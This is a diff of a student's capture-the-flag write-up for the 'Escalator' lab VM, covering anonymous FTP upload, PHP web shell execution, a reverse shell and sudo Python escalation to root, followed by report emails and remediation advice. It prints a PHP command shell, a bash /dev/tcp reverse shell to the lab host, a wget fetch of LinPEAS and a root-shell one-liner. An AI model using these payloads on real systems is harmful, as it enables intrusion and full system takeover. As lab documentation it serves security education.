@@ -1,707 +1,339 @@
-# Privilege Escalation - Walkthrough
+# Escalator - Privilege Escalation Walkthrough
 
 ## Project Information
 
-**Target OS:** Ubuntu 16.04.7 LTS (Xenial Xerus)
-
-**Objective:**
-Gain root privileges on the target machine and retrieve the flag located at:
-
-```bash
-/root/root.txt
-```
+- **Target OS:** Ubuntu 16.04.7 LTS Xenial Xerus
+- **Target IP Address:** 192.168.56.103
+- **Objective:** Gain root privileges on the target machine and retrieve the flag located at `/root/root.txt`.
 
 ---
 
-# Tools Used
+## Tools Used
 
 - Nmap
-- Gobuster
-- FTP
-- PHP
+- FTP client
 - Netcat
-- LinPEAS
+- SSH
 - Python 3.5
+- sudo
 - Bash
-- GTFOBins
 
 ---
 
-# Phase 1 - Host Discovery
+## Walkthrough
 
-Identify the target machine.
+### 1. Host Discovery
+
+First, I identified the target machine on the local network.
 
 ```bash
-nmap -sn 192.168.11.0/24
+nmap -sn 192.168.56.0/24
 ```
 
-Target IP discovered:
+The target was discovered at:
 
-```
-192.168.11.106
+```text
+192.168.56.103
 ```
 
 ---
 
-# Phase 2 - Port Scanning
+### 2. Service Enumeration
 
-Perform a full TCP scan.
+I scanned the target for open services.
 
 ```bash
-nmap -sV -sC -p- 192.168.11.106
+nmap -sV -sC -T4 -Pn 192.168.56.103
 ```
 
-Result:
+The scan showed the following services:
 
-```
-21/tcp   FTP
-22/tcp   SSH
-80/tcp   Apache HTTP
-```
+- `21/tcp` FTP
+- `22/tcp` SSH
+- `80/tcp` HTTP
 
-Important finding:
-
-- Anonymous FTP login enabled
+The FTP server allowed anonymous access.
 
 ---
 
-# Phase 3 - FTP Enumeration
+### 3. Anonymous FTP Access
 
-Connect anonymously.
-
-```bash
-ftp 192.168.11.106
-```
-
-Username:
-
-```
-anonymous
-```
-
-Password:
-
-```
-(any email)
-```
-
-List files.
+I connected to the FTP service using anonymous credentials.
 
 ```bash
-ls -la
+ftp 192.168.56.103
 ```
 
-Files found:
+Files found in the FTP directory:
 
-```
-life.c
-template.html
-test.php
-```
+- `life.c`
+- `template.html`
 
-Anonymous users also had upload permissions.
-
-Test upload:
-
-```bash
-put hello.txt
-```
-
-Upload succeeded.
+The FTP directory appeared to be exposed through the web server, which suggested uploaded files might be accessible through HTTP.
 
 ---
 
-# Phase 4 - Web Enumeration
+### 4. Initial Web Shell Upload
 
-Enumerate the website.
+I uploaded a PHP file to test code execution.
 
-```bash
-gobuster dir \
--u http://192.168.11.106 \
--w common.txt
-```
-
-Discovered:
-
-```
-/files
-```
-
-Browse:
-
-```
-http://192.168.11.106/files/
-```
-
-The FTP directory is directly exposed through Apache.
-
----
-
-# Phase 5 - Verify PHP Execution
-
-Create:
+Example payload:
 
 ```php
-<?php phpinfo(); ?>
+<?php system($_GET['cmd']); ?>
 ```
 
-Save as:
+After uploading the file to the FTP directory, I accessed it through the web server and confirmed command execution.
 
-```
-info.php
-```
-
-Upload:
+Example test:
 
 ```bash
-put info.php
+http://192.168.56.103/files/script.php?cmd=whoami
 ```
 
-Visit:
+The response showed:
 
-```
-http://192.168.11.106/files/info.php
-```
-
-PHP executed successfully.
-
-This confirmed Remote Code Execution (RCE).
-
----
-
-# Phase 6 - Obtain a Web Shell
-
-Create:
-
-```php
-<?php
-system($_GET['cmd']);
-?>
-```
-
-Save as:
-
-```
-script.php
-```
-
-Upload:
-
-```bash
-put script.php
-```
-
-Command execution:
-
-```
-http://192.168.11.106/files/script.php?cmd=whoami
-```
-
-Output:
-
-```
+```text
 www-data
 ```
 
----
-
-# Phase 7 - Initial Enumeration
-
-System information:
-
-```
-hostname
-pwd
-whoami
-cat /etc/os-release
-```
-
-Results:
-
-```
-Ubuntu 16.04.7
-www-data
-/var/www/html/files
-```
-
-Search SUID binaries:
-
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-Check Linux capabilities:
-
-```bash
-getcap -r / 2>/dev/null
-```
+This confirmed remote command execution as `www-data`.
 
 ---
 
-# Phase 8 - Reverse Shell
+### 5. Reverse Shell
 
-Start listener:
+To get an interactive shell, I started a listener on my machine:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Upload reverse shell:
+Then I uploaded a PHP reverse shell and triggered it through the browser.
 
-```php
+```bash
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.11.140/4444 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'");
 ?>
 ```
 
-Trigger:
 
-```
-http://192.168.11.106/files/rev.php
-```
+This gave me a shell as:
 
-Reverse shell received.
-
-Upgrade shell:
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
+```text
+www-data@ubuntu
 ```
 
 ---
 
-# Phase 9 - Enumeration with LinPEAS
+### 6. System Enumeration
 
-Host:
-
-```bash
-python3 -m http.server 8000
-```
-
-Target:
+From the `www-data` shell, I enumerated the system and found an interesting file in `/home`:
 
 ```bash
-wget http://192.168.11.140:8000/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh
+cd /home
+ls
+cat important.txt
 ```
 
-Interesting discovery:
+The file hinted to run a script:
 
-```
-/home/important.txt
-```
-
----
-
-# Phase 10 - Hidden Hint
-
-search in home :
-```bash 
-find /home -type f 2>/dev/null
-```
-
-Read file:
-
-```bash
-cat /home/important.txt
-```
-
-Contents indicated:
-
-```
-run the script
-
+```text
 /.runme.sh
 ```
 
-Inspect the script instead of executing it.
+I executed it and observed that it printed a misleading message and then exited early.
+
+I then inspected the script instead of trusting it blindly.
 
 ```bash
 cat /.runme.sh
 ```
 
-Inside the script:
+Inside the script, I found a hidden credential hint:
 
-```
+```text
 shrek:061fe5e7b95d5f98208d7bc89ed2d569
 ```
 
-The script intentionally exits before revealing the hidden line, encouraging source code review.
+This suggested a username and password for the local user `shrek`.
 
 ---
 
-# Phase 11 - Password Recovery
+### 7. Switch to Local User
 
-The embedded password hint corresponded to the credentials for the local user.
-
-User:
-
-```
-shrek
-```
-
-Password:
-
-```
-youaresmart
-```
-
-Switch user:
+I connected via SSH as `shrek` using the recovered password.
 
 ```bash
-su shrek
+ssh shrek@192.168.56.103
 ```
 
----
-
-# Phase 12 - Privilege Escalation Enumeration
-
-Check sudo permissions.
+After logging in, I checked sudo permissions:
 
 ```bash
 sudo -l
 ```
 
-Result:
+The output showed:
 
-```
-(root) NOPASSWD:
-/usr/bin/python3.5
+```text
+(root) NOPASSWD: /usr/bin/python3.5
 ```
 
-This is a dangerous sudo misconfiguration because Python can execute arbitrary system commands.
+This was the key privilege escalation path.
 
 ---
 
-# Phase 13 - Root Privilege Escalation
+### 8. Privilege Escalation to Root
 
-Run Python as root.
+Since `python3.5` could be executed as root without a password, I spawned a root shell using Python.
 
 ```bash
-sudo /usr/bin/python3.5
+sudo /usr/bin/python3.5 -c "import os; os.system('/bin/bash')"
 ```
 
-Inside Python:
+This gave me a root shell.
 
-```python
-import os
-os.system("/bin/bash")
-```
-
-Verify:
+I verified root access:
 
 ```bash
 whoami
+id
 ```
 
 Output:
 
-```
+```text
 root
-```
-
-Check identity:
-
-```bash
-id
-```
-
-Output:
-
-```
-uid=0(root)
-```
-
----
-change the apssword for the root :
-```bash 
-passwd root
-```
-
-# Phase 14 - Capture the Flag
-
-Read the flag.
-
-```bash
-cat /root/root.txt
-```
-
-Flag:
-
-```
-<01Talent@nokOpA3eToFrU8r5sW1dipe2aky>
-```
-
----
-## Email Report 
-Dear Security Team,
-
-I am writing to report a privilege escalation vulnerability identified during an authorized security assessment of the Escalator Challenge virtual machine.
-
-## Summary
-
-During testing, I identified a chain of security weaknesses that allowed complete compromise of the system. The web server permitted anonymous users to upload executable PHP files through an exposed FTP service. This resulted in remote command execution as the `www-data` user. Further enumeration revealed sensitive information stored in a world-readable script (`/.runme.sh`), exposing credentials for the local user `shrek`. Finally, the `shrek` account was configured with passwordless sudo access to `/usr/bin/python3.5`, allowing immediate privilege escalation to root.
-
-## Steps to Reproduce
-
-1. Discover the target machine on the network using `nmap` or another network discovery tool.
-2. Enumerate the web server and identify the exposed `/files` directory.
-3. Log in to the FTP service using anonymous authentication.
-4. Upload a PHP web shell into the `/files` directory.
-5. Execute commands through the web shell and obtain code execution as the `www-data` user.
-6. Enumerate the filesystem and identify the readable file `/.runme.sh`.
-7. Read the script and recover the credentials for the local user:
-
-   * Username: `shrek`
-   * Password: `youaresmart`
-8. Switch to the `shrek` account using:
-
-   ```
-   su shrek
-   ```
-9. Enumerate sudo privileges:
-
-   ```
-   sudo -l
-   ```
-10. Observe that the user can execute `/usr/bin/python3.5` as root without a password.
-11. Start a privileged Python interpreter:
-
-```
-sudo /usr/bin/python3.5
-```
-
-12. Spawn a root shell:
-
-```python
-import os
-os.system("/bin/bash")
-```
-
-13. Verify root access:
-
-```
-id
-```
-
-14. Retrieve the flag:
-
-```
-cat /root/root.txt
-```
-
-## Impact
-
-The identified vulnerabilities allow an unauthenticated attacker to obtain remote code execution through file upload, access sensitive credentials stored in readable files, and escalate privileges to full root access. Successful exploitation completely compromises the confidentiality, integrity, and availability of the affected system.
-
-## Proof of Root Access
-
-Root shell obtained:
-
-```
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+---
+
+### 9. Retrieve the Flag
+
+Finally, I read the root flag:
+
+```bash
+cat /root/root.txt
+```
+
 Flag:
 
-```
+```text
 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
 ```
 
-A screenshot showing the root shell together with the contents of `/root/root.txt` is attached as evidence.
-
-## Recommendations
-
-* Disable anonymous FTP access unless absolutely necessary.
-* Prevent executable file uploads or store uploaded files outside the web root.
-* Configure the web server to prevent execution of uploaded PHP files.
-* Never store credentials in readable scripts or plaintext files.
-* Apply the principle of least privilege to sudo permissions.
-* Remove unnecessary `NOPASSWD` sudo rules or restrict them to safe administrative commands.
-* Regularly audit file permissions and user privileges.
-
-Thank you for your time and consideration. Please let me know if any additional information is required.
-
-Kind regards,
-
-**Fahd Aguenouz**
-Cybersecurity Student / Penetration Tester
-
-
-# Vulnerabilities Identified
-
-## 1. Anonymous FTP Access
-
-Severity: High
-
-Anonymous users could upload files to the server.
-
-Impact:
-
-- Unauthorized file upload
-- Malware upload
-- Web shell deployment
-
-Mitigation:
-
-- Disable anonymous FTP.
-- Require authentication.
-- Restrict upload permissions.
-
 ---
 
-## 2. FTP Directory Exposed Through Apache
+## Vulnerabilities Identified
 
-Severity: High
+### 1. Anonymous FTP Access
+Anonymous login was enabled on the FTP server, allowing unauthenticated access to files.
 
-The FTP upload directory was accessible from the web server.
+### 2. Web-Accessible FTP Directory
+The FTP directory was exposed through Apache, making uploaded files directly reachable from the web server.
 
-Impact:
+### 3. PHP Execution in Upload Directory
+The server executed uploaded PHP files, enabling remote code execution.
 
-- Uploaded files became publicly accessible.
+### 4. Credential Disclosure in Script
+A readable script contained credentials for the `shrek` user.
 
-Mitigation:
-
-- Separate FTP storage from the web root.
-- Restrict Apache access.
-
----
-
-## 3. PHP Execution in Upload Directory
-
-Severity: Critical
-
-Uploaded PHP files were executed by Apache.
-
-Impact:
-
-- Remote Code Execution
-
-Mitigation:
-
-- Disable PHP execution in upload directories.
-- Store uploads outside the web root.
-- Restrict executable file types.
+### 5. Dangerous sudo Configuration
+The `shrek` user had passwordless sudo access to `/usr/bin/python3.5`, which allowed full root compromise.
 
 ---
-
-## 4. Weak Password Disclosure
-
-Severity: High
-
-The password was embedded inside a readable script.
-
-Impact:
-
-- Local privilege escalation.
-
-Mitigation:
-
-- Never hardcode credentials.
-- Protect sensitive scripts.
-- Store secrets securely.
-
----
-
-## 5. Dangerous sudo Configuration
-
-Severity: Critical
-
-```
-(root) NOPASSWD:
-/usr/bin/python3.5
-```
-
-Impact:
-
-Python can execute arbitrary commands as root, allowing complete system compromise.
-
-Mitigation:
-
-- Remove Python from sudoers.
-- Use least privilege.
-- Replace interpreters with restricted wrapper scripts where necessary.
-
----
-
-# Ethical Hacking Report
-
-This assessment was performed exclusively in a controlled laboratory environment for educational purposes.
-
-No unauthorized systems were accessed.
-
-All exploitation steps were conducted to demonstrate security weaknesses and provide recommendations for remediation.
-
-The objective of this project was to improve defensive security by identifying and documenting privilege escalation paths.
-
----
-
-# Vulnerability Report Email
-
-**Subject:** Critical Privilege Escalation Vulnerabilities Identified
-
-Dear Security Team,
-
-During the security assessment, multiple vulnerabilities were identified that allowed complete compromise of the target system.
-
-## Summary
-
-The server allows anonymous FTP uploads directly into a web-accessible directory where PHP files are executed. This enables remote code execution as the `www-data` user. During local enumeration, credentials for another user were recovered from a readable script. That user had passwordless sudo access to Python, allowing full root compromise.
-
-## Steps to Reproduce
-
-1. Scan the target using Nmap.
-2. Log into FTP anonymously.
-3. Upload a PHP web shell.
-4. Execute commands through Apache.
-5. Obtain a reverse shell.
-6. Enumerate the system.
-7. Read `/home/important.txt`.
-8. Inspect `/.runme.sh`.
-9. Recover the password for the `shrek` account.
-10. Switch to the `shrek` user.
-11. Execute `sudo -l`.
-12. Run `sudo /usr/bin/python3.5`.
-13. Spawn a root shell.
-14. Read `/root/root.txt`.
 
 ## Impact
 
-An attacker can gain complete administrative control of the operating system.
+The chain of vulnerabilities allowed complete compromise of the system. An attacker could:
 
-Potential consequences include:
+- Execute arbitrary commands remotely.
+- Obtain an interactive shell.
+- Recover local credentials.
+- Escalate to root.
+- Read sensitive files.
+- Potentially maintain persistence or move laterally.
 
-- Full data compromise
-- Persistence installation
-- Credential theft
-- Service disruption
-- Lateral movement
-
-## Proof of Root Access
-
-```
-# whoami
-root
-
-# id
-uid=0(root)
-
-# cat /root/root.txt
-<01Talent@nokOpA3eToFrU8r5sW1dipe2aky>
-```
-
-Regards,
-
-Security Researcher
+This is a **critical** security issue because root access means full control of the machine.
 
 ---
 
-# Lessons Learned
+## Remediation
 
-- Always perform thorough enumeration before exploitation.
-- Read scripts instead of blindly executing them.
-- Validate every assumption.
-- GTFOBins is an excellent resource for identifying privilege escalation techniques involving misconfigured binaries.
-- Small misconfigurations can combine into a complete system compromise.
+- Disable anonymous FTP unless it is strictly required.
+- Remove executable permissions from upload directories.
+- Store uploaded files outside the web root.
+- Disable PHP execution in file upload locations.
+- Never store plaintext credentials in scripts or readable files.
+- Apply least privilege to sudo rules.
+- Remove unnecessary `NOPASSWD` entries.
+- Regularly audit file permissions and exposed services.
+
+---
+
+## Vulnerability Report Email
+
+**To:** security@example.com  
+**Subject:** Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM
+
+Dear Security Team,
+
+I am writing to report a critical privilege escalation vulnerability identified during an authorized assessment of the Escalator Challenge VM.
+
+### Summary
+
+The target system contains a chain of misconfigurations that allow an attacker to gain remote code execution through an anonymous FTP upload directory, recover a local user credential from a readable script, and escalate to root through a dangerous sudo configuration allowing passwordless execution of Python as root.
+
+### Steps to Reproduce
+
+1. Discover the target at `192.168.56.103`.
+2. Enumerate services and confirm anonymous FTP access.
+3. Upload a PHP file to the FTP directory.
+4. Access the uploaded file through the web server and confirm command execution.
+5. Obtain a shell as `www-data`.
+6. Enumerate the filesystem and inspect `/.runme.sh`.
+7. Recover the credentials for the `shrek` user.
+8. SSH into the system as `shrek`.
+9. Run `sudo -l` and observe passwordless access to `/usr/bin/python3.5`.
+10. Execute Python as root and spawn a root shell.
+11. Read `/root/root.txt`.
+
+### Impact
+
+This vulnerability allows full system compromise. An attacker could gain root access, read sensitive data, modify system files, install persistence mechanisms, and disrupt services.
+
+### Proof of Root Access
+
+I successfully obtained root access and retrieved the flag:
+
+```text
+01Talent@nokOpA3eToFrU8r5sW1dipe2aky
+```
+
+Best regards,  
+Aguenouz Fahd
+
+---
+
+## Ethical Hacking Report
+
+This assessment was performed only in a controlled laboratory environment for educational purposes. No unauthorized systems were accessed. The purpose of the project was to understand privilege escalation techniques and document remediation strategies.
+
+### Ethical Responsibilities
+
+- Always obtain explicit authorization before testing any system.
+- Stay within the agreed scope of the assessment.
+- Avoid causing unnecessary disruption or data loss.
+- Report vulnerabilities responsibly and clearly.
+- Provide remediation guidance, not just exploitation details.
+
+### Legal and Ethical Boundaries
+
+Unauthorized testing can be illegal and harmful. Even when a vulnerability is discovered, it must only be tested in approved environments or under a valid engagement.
+
+### Responsible Disclosure
+
+A professional report should explain the issue, the impact, the reproduction steps, and the recommended fixes. The goal is to help defenders improve security, not to cause damage.
+
